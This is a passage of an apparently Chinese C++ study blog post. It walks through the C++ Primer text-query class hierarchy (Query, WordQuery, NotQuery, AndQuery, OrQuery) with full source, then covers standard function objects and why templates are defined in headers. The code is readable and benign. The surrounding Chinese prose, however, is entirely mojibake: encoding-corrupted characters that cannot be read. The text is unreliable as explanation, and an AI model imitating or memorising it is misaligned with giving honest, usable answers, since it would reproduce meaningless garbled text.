<p>è¿™ä¹ˆåšæˆ‘æ„Ÿè§‰æœ€å¤§çš„å¥½å¤„å°±æ˜¯è®©æ•´ä¸ªç»§æ‰¿ä½“ç³»æ¡ç†åˆ†æ˜ï¼Œå±‚æ¬¡å…³ç³»æ¸…æ™°ï¼Œè¿˜å‡å°‘äº†ä»£ç çš„å†—ä½™é‡ã€‚</p>
<p>è¦å¤„ç†æŸä¸€ç±»äº‹æƒ…ä¸èƒ½ç›´æ¥ä½¿ç”¨æˆ‘ä»¬æ„é€ çš„ç»§æ‰¿ä½“ç³»ï¼Œå› ä¸ºæœ€åæ´¾ç”Ÿç±»ä½ æ”¹ä½¿ç”¨å“ªä¸€ä¸ªæ´¾ç”Ÿç±»å‘¢ï¼Œæ‰€ä»¥å¾—å†æ„é€ ä¸€ä¸ªç±»æ¥ç®¡ç†ä½¿ç”¨è¿™ä¸ªç»§æ‰¿ä½“ç³»ï¼Œè¿™ä¸ªç±»ï¼ˆå³Queryï¼‰å°±æ˜¯è¿™ä¸ªç»§æ‰¿ä½“ç³»çš„æ¥å£ç±»ï¼Œæš´éœ²äº†è¿™ä¸ªç»§æ‰¿ä½“ç³»çš„æ¥å£åˆéšè—äº†æ•´ä¸ªç»§æ‰¿ä½“ç³»ã€‚</p>
<p>ä¸‹é¢æ˜¯è¿™ä¸ªè”ç³»çš„ä»£ç </p>
<p>Query.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query_base</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Query</span>(<span class="keyword">const</span> std::string &amp;s);</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Query</span>(std::shared_ptr&lt;Query_base&gt; query) :<span class="built_in">q</span>(query)&#123;&#125;;</span><br><span class="line">    std::shared_ptr&lt;Query_base&gt; q;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERY_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;os,<span class="keyword">const</span> Query &amp;query)&#123;</span><br><span class="line">    <span class="keyword">return</span> os&lt;&lt;query.<span class="built_in">rep</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">Query::eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q-&gt;<span class="built_in">eval</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">std::string <span class="title">Query::rep</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q-&gt;<span class="built_in">rep</span>();</span><br><span class="line">&#125;</span><br><span class="line">Query::<span class="built_in">Query</span>(<span class="keyword">const</span> std::string &amp;s):<span class="built_in">q</span>(<span class="keyword">new</span> <span class="built_in">WordQuery</span>(s))&#123;&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query &amp;q) &#123;</span><br><span class="line"><span class="comment">//    this-&gt;q=std::shared_ptr&lt;Query_base&gt;(new NotQuery(*this));</span></span><br><span class="line"><span class="comment">//    return *this;</span></span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> <span class="built_in">NotQuery</span>(q));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r) &#123;</span><br><span class="line"><span class="comment">//    this-&gt;q=std::shared_ptr&lt;Query_base&gt;(new AndQuery(*this,r));</span></span><br><span class="line"><span class="comment">//    return *this;</span></span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> <span class="built_in">AndQuery</span>(l,r));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r) &#123;</span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> <span class="built_in">OrQuery</span>(l,r));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query_base.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERY_BASE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERY_BASE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query_base</span>&#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span>;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Query_base</span>()=<span class="keyword">default</span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span> </span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WordQuery</span>:</span><span class="keyword">public</span> Query_base&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span>;</span></span><br><span class="line">    <span class="built_in">WordQuery</span>(<span class="keyword">const</span> std::string &amp;s) :<span class="built_in">query_word</span>(s)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="built_in">query</span>(query_word);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> query_word;</span><br><span class="line">    &#125;;</span><br><span class="line">    std::string query_word;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotQuery</span>:</span><span class="keyword">public</span> Query_base&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query&amp;);</span><br><span class="line">    <span class="function">std::string  <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~(&quot;</span>+query.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    Query query;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">NotQuery</span>(<span class="keyword">const</span> Query &amp;q): <span class="built_in">query</span>(q)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinareyQuery</span> :</span> <span class="keyword">public</span> Query_base&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">BinareyQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r,<span class="keyword">const</span> std::string &amp;s):<span class="built_in">lhs</span>(l),<span class="built_in">rhs</span>(r),<span class="built_in">opSym</span>(s)&#123;&#125;;</span><br><span class="line">    <span class="function">std::string  <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+lhs.<span class="built_in">rep</span>()+<span class="string">&quot; &quot;</span>+opSym+<span class="string">&quot; &quot;</span>+rhs.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Query lhs,rhs;</span><br><span class="line">    std::string opSym;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AndQuery</span>:</span><span class="keyword">public</span> BinareyQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="built_in">AndQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r): <span class="built_in">BinareyQuery</span>(l,r,<span class="string">&quot;&amp;&quot;</span>)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrQuery</span>:</span><span class="keyword">public</span> BinareyQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="built_in">OrQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r): <span class="built_in">BinareyQuery</span>(l,r,<span class="string">&quot;|&quot;</span>)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERY_BASE_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query_base.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">NotQuery::eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> result=query.<span class="built_in">eval</span>(t);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines= std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">    <span class="keyword">auto</span> beg=result.begin,end=result.end;</span><br><span class="line">    <span class="keyword">auto</span> size=result.<span class="built_in">get_file</span>()-&gt;<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> n=<span class="number">0</span>;n!=size;n++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(beg==end|| *beg!=n)&#123;</span><br><span class="line">            ret_lines-&gt;<span class="built_in">insert</span>(n);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(beg!=end)&#123;</span><br><span class="line">            ++beg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,result.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">OrQuery::eval</span><span class="params">(TextQuery &amp;test)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> letf=lhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> right=rhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines=std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;(letf.begin,letf.end);</span><br><span class="line">    ret_lines-&gt;<span class="built_in">insert</span>(right.begin,right.end);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,letf.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">AndQuery::eval</span><span class="params">(TextQuery &amp;test)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> letf=lhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> right=rhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines=std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">    std::<span class="built_in">set_intersection</span>(letf.begin,letf.end,right.begin,right.end,std::<span class="built_in">inserter</span>(*ret_lines,ret_lines-&gt;<span class="built_in">begin</span>()));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,letf.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream file;</span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;./2.txt&quot;</span>,ios::in);</span><br><span class="line">    <span class="keyword">if</span>(!file)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;open file fail&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    Query q=<span class="built_in">Query</span>(<span class="string">&quot;is&quot;</span>) &amp; <span class="built_in">Query</span>(<span class="string">&quot;that&quot;</span>)|<span class="built_in">Query</span>(<span class="string">&quot;serious&quot;</span>);</span><br><span class="line">    <span class="function">TextQuery <span class="title">textquery</span><span class="params">(file)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> res=q.<span class="built_in">eval</span>(textquery);</span><br><span class="line">    <span class="built_in">print</span>(cout,res)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20230204002217162.png" alt="image-20230204002217162"></p>
<h2 id="è¿ç®—ç¬¦ç±»"><a href="#è¿ç®—ç¬¦ç±»" class="headerlink" title="è¿ç®—ç¬¦ç±»"></a>è¿ç®—ç¬¦ç±»</h2><p>è¿ç®—ç¬¦ç±»æ˜¯å¯¹è¿ç®—çš„ä¸€ä¸ªæ‰©å±•å§ç›¸å½“äºï¼Œå¯ä»¥æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plus&lt;<span class="keyword">int</span>&gt; intadd;</span><br><span class="line"><span class="keyword">int</span> s=<span class="built_in">intadd</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸å†æ˜¯ç›´æ¥ä½¿ç”¨è¿ç®—ç¬¦ï¼Œè€Œæ˜¯åšäº†ä¸€å±‚å°è£…ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„å°±æ˜¯è®©è¿ç®—æ›´åŠ é€‚æ™®ã€‚æ¯”å¦‚ä¸¤ä¸ªæŒ‡é’ˆçš„<code>&lt;</code>æ“ä½œï¼Œä¸èƒ½ç›´æ¥<code>p1&lt;p2</code>è¿™ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯å¯ä»¥è¿™æ ·</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less&lt;<span class="keyword">char</span> *&gt; intptrless;</span><br><span class="line"><span class="keyword">bool</span> s=<span class="built_in">intptrless</span>(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;2324&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™ç§è¿ç®—ç¬¦ç±»æ˜¯æ ‡å‡†åº“æä¾›çš„ã€‚</p>
<p>ä½¿ç”¨è¿ç®—ç¬¦ç±»è¿›è¡Œæ¨¡æ¿ç¼–ç¨‹ä¼šæ›´åŠ ç±»å‹æ— å…³å’Œå¯ç§»æ¤æ€§ã€‚</p>
<h2 id="å…³äºæ¨¡æ¿å‡½æ•°è¦åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰çš„é—®é¢˜"><a href="#å…³äºæ¨¡æ¿å‡½æ•°è¦åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰çš„é—®é¢˜" class="headerlink" title="å…³äºæ¨¡æ¿å‡½æ•°è¦åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰çš„é—®é¢˜"></a>å…³äºæ¨¡æ¿å‡½æ•°è¦åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰çš„é—®é¢˜</h2><p>ä¹‹å‰è®¨è®ºè¿‡æ™®é€šå˜é‡æˆ–è€…æ™®é€šå‡½æ•°èƒ½å¦åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„é—®é¢˜ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œè¿™æ˜¯éå¸¸æ„šè ¢çš„è¡Œä¸ºï¼Œä½†æ˜¯è¿™æ¡è§„åˆ™åœ¨æ¨¡æ¿ç¼–ç¨‹ä¸­ä¸é€‚ç”¨ï¼Œå½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªæ¨¡æ¿å®šä¹‰çš„æ—¶å€™ï¼Œä»–å¹¶ä¸ä¼šç”Ÿæˆä»£ç ï¼Œåªæœ‰åœ¨å½“å®ä¾‹åŒ–æ¨¡æ¿çš„ä¸€ä¸ªç‰¹å®šç‰ˆæœ¬æ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šç”Ÿæˆä»£ç ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨è€Œä¸æ˜¯å®šä¹‰æ¨¡æ¿çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨æ‰ä¼šç”Ÿæˆä»£ç ï¼Œè¿™ä¸€ç‰¹æ€§éå¸¸é‡è¦ã€‚å‡å¦‚æœ‰å¦‚ä¸‹æ–‡ä»¶</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.cppå¼•ç”¨äº†add.h,å½“ä½¿ç”¨add(1,1)çš„æ—¶å€™å°±éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªadd(int,int)çš„å‡½æ•°ï¼Œæ¨¡æ¿å°±å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡å¤´æ–‡ä»¶å®ä¾‹åŒ–ï¼Œä½†æ˜¯å¦‚æœåªæœ‰å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œè€Œå®šä¹‰åœ¨cppæ–‡ä»¶ä¸­ï¼Œåœ¨é“¾æ¥æœŸé—´å°±ä¼šæŠ¥é”™äº†ã€‚å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mainå‡½æ•°æƒ³è¦å¯»æ‰¾addæ¨¡æ¿å‡½æ•°å¹¶ä¸”å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œå‘ç°å¤´æ–‡ä»¶ä¸­åªæœ‰å£°æ˜ï¼Œä»–å°±ä¼šè®¤ä¸ºè¿™ä¸ªå‡½æ•°ä¼šåœ¨add.cppä¸­è¿›è¡Œå®ä¾‹åŒ–ï¼Œåˆ°æ—¶å€™åœ¨é“¾æ¥æœŸé—´è¿›è¡Œé“¾æ¥å°±å¥½äº†ï¼Œä½†æ˜¯åœ¨ç¼–è¯‘add.cppè¿™ä¸ªæ¨¡å—çš„æ—¶å€™åˆæ²¡æœ‰ä½¿ç”¨addæ¨¡æ¿å‡½æ•°ï¼Œä¹Ÿå°±ä¸ä¼šç»™ä»–å®ä¾‹åŒ–ï¼Œå¯¼è‡´æœ€ç»ˆé“¾æ¥æœŸé—´ï¼Œmainæ¨¡å—æƒ³è¦é“¾æ¥addæ¨¡å—ä¸­çš„å‡½æ•°ï¼Œä½†æ˜¯addæ¨¡å—æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œå¯¼è‡´é“¾æ¥é”™è¯¯ã€‚</p>
